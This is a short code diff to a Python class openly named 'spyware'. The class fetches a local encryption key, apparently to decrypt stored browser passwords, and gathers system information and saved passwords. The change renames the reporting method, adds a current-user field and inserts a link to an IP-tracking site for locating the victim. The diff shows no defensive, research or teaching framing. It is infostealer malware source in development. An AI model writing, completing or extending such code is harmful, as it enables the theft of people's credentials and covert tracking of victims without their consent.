@@ -11,8 +11,11 @@ from Cryptodome.Cipher import AES
 
 class spyware:
     ip = ""
+    current_user = ""
+
     def __init__(self):
         self.ip = ""
+        self.current_user = ""
 
     def fetch_encryption_key(self):
         local_computer_directory_path = os.path.join(
@@ -102,8 +105,8 @@ class spyware:
 
         return final_str
 
-    def report(self):
-        system_info = ""
+    def get_info(self):
+        system_info = "For tracking the user by ip go to: {}.\n".format("https://www.opentracker.net/feature/ip-tracker/")
         try:
             system_info += self.get_system_info()
             system_info += self.get_passwords()
